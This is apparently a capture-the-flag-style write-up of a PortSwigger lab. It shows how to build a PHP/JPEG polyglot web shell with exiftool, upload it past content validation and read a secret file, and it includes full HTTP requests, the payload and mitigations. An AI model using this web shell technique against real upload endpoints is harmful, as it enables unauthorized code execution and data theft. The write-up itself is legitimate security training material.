# 📘 PortSwigger Lab: Web shell upload via content type restriction bypass

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass  
> 🎯 Topic: Unrestricted File Upload — bypassing content validation via a PHP/JPEG polyglot file  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  
> 🛠 Tools: Burp Suite, exiftool 13.55, file

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔬 Why the Polyglot Works](#polyglot)
- [🐚 Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function](#step1)
- [🔍 Step 2 — Verify the Source Image](#step2)
- [🔍 Step 3 — Metadata Experiment](#step3)
- [🔍 Step 4 — Creating the Polyglot with exiftool](#step4)
- [🔍 Step 5 — Verifying the Polyglot](#step5)
- [🔍 Step 6 — Upload and Secret Extraction](#step6)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Bypass the file content validation: the server only accepts genuine images. The task is to:

```text
1. Create a PHP/JPEG polyglot — a file that is simultaneously a valid JPEG
   and contains executable PHP code.
2. Upload it as the avatar, passing the content validation.
3. Execute the code via a GET request to the uploaded file.
4. Read /home/carlos/secret and submit it as the solution.
```

Test user credentials:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Short Theory

A stronger defense than an extension blacklist is content validation: the server verifies that the file is a genuine image (via magic bytes / JPEG or PNG structure).

Properties of this defense:

```text
+ Blocks a simple renaming bypass (shell.php.jpg)
+ Blocks uploading text PHP files with a spoofed Content-Type
− Does NOT check ALL of the file's content
− JPEG has a redundant structure: metadata (the COM segment)
  can carry arbitrary text without breaking the format
```

A **polyglot file** is a file valid in two formats at once. JPEG carries a comment in its COM segment; the PHP interpreter executes text between `<?php` and `?>` regardless of the rest of the content. The file remains a genuine image — and simultaneously works as a PHP shell.

---

<a id="idea"></a>

## 🧩 Core Idea

Two parsers read one file:

```text
Content validation (image validator):  FF D8 ... JPEG structure with a COM segment
                                       → "this is a genuine JPEG" → pass ✅

PHP interpreter (Apache + mod_php):    scans the bytes, finds <?php ... ?>
                                       → executes the code in the COM segment
```

The `.php` extension is needed so Apache hands the file to the PHP handler; the validator only looks at the content — and the content is legitimate.

---

<a id="polyglot"></a>

## 🔬 Why the Polyglot Works

### JPEG metadata is not checked for "dangerousness"

The recon experiment showed:

```text
exiftool -Comment="Hello from metadata" test.jpg
file test.jpg
→ test.jpg: JPEG image data, ..., comment: "Hello from metadata",
  baseline, precision 8, 200x200, components 3
```

Adding text to `Comment` does not break the JPEG structure. Replacing "Hello from metadata" with PHP code only changes the COM segment's content — the format stays valid.

### PHP and binary data are compatible

The PHP interpreter prints everything outside `<?php ... ?>` tags as-is and executes only the tag contents. So a valid JPEG with PHP code in its metadata executes without errors: the binary bytes are simply printed, and the code inside `<?php ... ?>` runs.

---

<a id="webshell"></a>

## 🐚 Web Shell

PHP code embedded in the metadata, with markers to locate the result among the binary output:

```php
<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

Breakdown:

```text
echo        — prints the result
'START '    — start marker (to find the secret in the binary data)
.           — string concatenation
file_get_contents('/home/carlos/secret') — reads the target file
' END'      — end marker
```

Output when executed:

```text
START LAB-SECRET END
```

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

The polyglot creation command:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" images.jpg -o polyglot.php
```

Parameter breakdown:

```text
-Comment="..."   — write the PHP code into the JPEG metadata (COM segment)
images.jpg       — the original genuine JPEG (not the modified test.jpg —
                   so the metadata is clean and contains only our code)
-o polyglot.php  — the output filename (it is -o that defines it,
                   so the file is created with the .php extension right away)
```

Quoting: the outer double quotes are for the shell, the single quotes inside are part of the PHP code.

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function

1. Log in as `wiener:peter`.
2. Attempt to upload `exploit.php` with a classic shell. Response:

```text
You can only upload JPG and PNG files.
```

3. Attempt to upload `exploit.php` with a spoofed `Content-Type: image/jpeg` (as in the previous lab). Response — the same error.

Conclusion: this filter validates the **file content**, not the request headers.

---

<a id="step2"></a>

## 🔍 Step 2 — Verify the Source Image

Prepare a genuine JPEG and inspect it:

```bash
file images.jpg
exiftool images.jpg
```

exiftool output:

```text
File Type                       : JPEG
MIME Type                       : image/jpeg
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Image Size                      : 200x200
```

Checking the Comment field:

```bash
exiftool -Comment images.jpg
```

The field is absent — the file is clean and ready for experiments.

---

<a id="step3"></a>

## 🔍 Step 3 — Metadata Experiment

A control experiment: modify the metadata and confirm the JPEG stays a JPEG.

```bash
cp images.jpg test.jpg
exiftool -Comment="Hello from metadata" test.jpg
exiftool -Comment test.jpg
file test.jpg
```

Output:

```text
Comment                         : Hello from metadata

test.jpg: JPEG image data, JFIF standard 1.01, ..., comment:
"Hello from metadata", baseline, precision 8, 200x200, components 3
```

Experiment conclusion:

```text
Comment added          → the Comment field appeared in the metadata
Format not broken      → file still identifies it as JPEG
Image structure intact → 200x200, baseline, components 3
```

This is exactly what the polyglot idea builds on: text in metadata is format-compatible.

---

<a id="step4"></a>

## 🔍 Step 4 — Creating the Polyglot with exiftool

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" images.jpg -o polyglot.php
```

Response:

```text
1 image files created
```

---

<a id="step5"></a>

## 🔍 Step 5 — Verifying the Polyglot

```bash
file polyglot.php
exiftool -Comment polyglot.php
```

Output:

```text
polyglot.php: JPEG image data, JFIF standard 1.01, ..., comment:
"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>",
baseline, precision 8, 200x200, components 3

Comment                         : <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

Both checks passed:

```text
[✓] The file is identified as JPEG despite the .php extension
[✓] The Comment field contains the PHP code with START and END markers
```

---

<a id="step6"></a>

## 🔍 Step 6 — Upload and Secret Extraction

1. Upload `polyglot.php` as the avatar via the My Account form — the server accepts the file (content validation passed).
2. In Burp → Proxy → HTTP history, find the avatar-serving request:

```http
GET /files/avatars/polyglot.php
```

and send it to Repeater (if the request is not visible — refresh the account page, check the MIME Images filter, or take the request from Target → Site map).

3. Send the request. The response contains binary image bytes and the executed PHP output.
4. Search for the `START` marker in the response. Between the markers — the secret:

```text
START SECRET-VALUE-HERE END
```

5. Submit the secret via the button in the lab banner → Solved.

---

<a id="requests"></a>

## 📨 Example Requests

### Blocked upload (baseline)

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
...
```

Response:

```text
You can only upload JPG and PNG files.
```

### Working polyglot upload

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/jpeg

FFD8FFE0 ... [JPEG: SOI, JFIF, COM segment with PHP code, image scan] ... FFD9
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundary--
```

The upload is accepted — the file is a genuine JPEG.

### Request to the polyglot

```http
GET /files/avatars/polyglot.php HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

---

<a id="response"></a>

## 📥 Example Result

### Response to the polyglot request (fragment)

```http
HTTP/2 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

ÿØÿà [binary JPEG bytes] START SECRET-VALUE-HERE END [binary JPEG bytes]
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Map the filter: plain .php and Content-Type spoofing are blocked
3. Prepare a genuine JPEG (200x200), verify via file/exiftool
4. Experiment: a Comment can be added without breaking the JPEG structure
5. Create the polyglot: exiftool -Comment="PHP code" images.jpg -o polyglot.php
6. Verify: file identifies JPEG, Comment contains PHP
7. Upload polyglot.php as the avatar → accepted (content validation passed)
8. GET /files/avatars/polyglot.php → find START ... END in the response
9. Secret retrieved and submitted — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Content Validation Has a Blind Spot

The validator confirms the file is a valid JPEG but does not analyze the metadata content. The COM segment is a legitimate place for arbitrary text.

### 2. JPEG Is Redundant

The format carries foreign data without breaking the structure. The image opens, renders, passes every check — and simultaneously carries PHP code.

### 3. The .php Extension Enables Execution

The server validates the content but selects the handler by extension. `.php` → mod_php → the PHP interpreter scans the entire file and executes the code in the tags.

### 4. Two Parsers, Two Readings

```text
Image validator:   "a valid JPEG"      → pass
PHP interpreter:   "code after <?php"  → execution
```

The same parser-discrepancy principle as in the previous labs — but at the file content level, not the filename.

### 5. START/END Markers Solve the Binary Output Problem

The secret is surrounded by binary JPEG bytes — finding it by eye in the response is hard. The markers make the result findable by a simple string search.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When facing a content filter:

```text
1. Map it: does the server block Content-Type spoofing? (this lab — yes)
2. Study the format: does JPEG/PNG have redundant fields for data
   (JPEG COM segment, PNG tEXt chunks)?
3. Test: does the server accept an image with data in those fields?
4. Combine: polyglot = valid format + executable code
5. Locate the output: markers around the result, search in the binary response
6. Enable execution: the extension the server routes to the right handler
```

The key question is always the same: **what exactly does the server check — and what does it not check?**

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Using the Modified test.jpg Instead of the Clean images.jpg

`test.jpg` already contains a foreign comment. Use the original `images.jpg` for the polyglot so the metadata contains only the PHP code.

### Mistake 2. Confusing -Comment and -o

`-Comment` is the metadata-write parameter, `-o` is the output filename. Without `-o`, exiftool modifies the file in place (creating an `_original` backup).

### Mistake 3. Breaking the Quotes in the Command

Outer double quotes are for the shell, single quotes inside are part of the PHP code:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents(...) . ' END'; ?>" images.jpg -o polyglot.php
```

Double quotes inside double quotes break the command.

### Mistake 4. Not Verifying the Polyglot Before Uploading

Always check `file polyglot.php` + `exiftool -Comment polyglot.php` before submitting to the server — this localizes errors locally, not on the lab.

### Mistake 5. Searching for the Secret by Eye in the Binary Response

The response contains thousands of binary bytes. Without START/END markers, finding the secret is nearly impossible — the markers are not decoration, they are a required payload element.

### Mistake 6. Missing That the .php Extension Is Mandatory

A polyglot without `.php` gets stored, but Apache will not hand it to the PHP handler — the file is served as binary. The content passes validation; the extension enables execution.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Rely on Content Validation Alone

A valid JPEG can carry arbitrary data in its metadata — format validation does not check content safety.

### 2. Do Not Derive the Handler from the User-Supplied Name

Generate the filename server-side (UUID); do not preserve user extensions.

### 3. Reprocess the Image

Decode the uploaded image and re-encode it (ImageMagick/Pillow) — metadata with foreign code is discarded, only the pixel map remains.

### 4. Strip Metadata

Remove EXIF/COM segments after upload if they are not needed.

### 5. Storage Outside the Web Root and No Execution

Uploaded files must not be executed by any interpreter, even if the name matches an executable extension.

### 6. Serve with a Fixed Content-Type

Serve files from the upload directory with a fixed `Content-Type: image/jpeg` and a `Content-Disposition: attachment` header.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] Plain `exploit.php` blocked
- [ ] Content-Type spoofing blocked → conclusion: content is validated

### Preparation

- [ ] A genuine JPEG found, verified via file/exiftool
- [ ] Control experiment: a Comment can be added, JPEG stays JPEG
- [ ] Polyglot created with the exiftool command using -o polyglot.php
- [ ] file polyglot.php → JPEG, exiftool → PHP code in Comment

### Exploitation

- [ ] polyglot.php accepted by the server as the avatar
- [ ] GET /files/avatars/polyglot.php found and sent to Repeater
- [ ] START marker found, the secret is between the markers
- [ ] Secret submitted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via a **PHP/JPEG polyglot**:

```text
1. Content validation checks only the JPEG structure — metadata is not analyzed
2. exiftool writes the PHP code into the COM segment, the JPEG stays valid
3. The .php file is accepted and handed to the PHP handler
4. The code executes when the file is requested, the secret is found between START/END
```

Main lessons:

```text
Format validation ≠ content safety: a valid JPEG can carry code.
```

```text
A polyglot exploits format redundancy: image and executable code are compatible in one file.
```

```text
START/END markers are a practical technique for extracting results from binary output.
```

```text
Mitigation: image reprocessing, metadata stripping, server-side names, no execution.
```

---

[⬆ Back to top](#top)
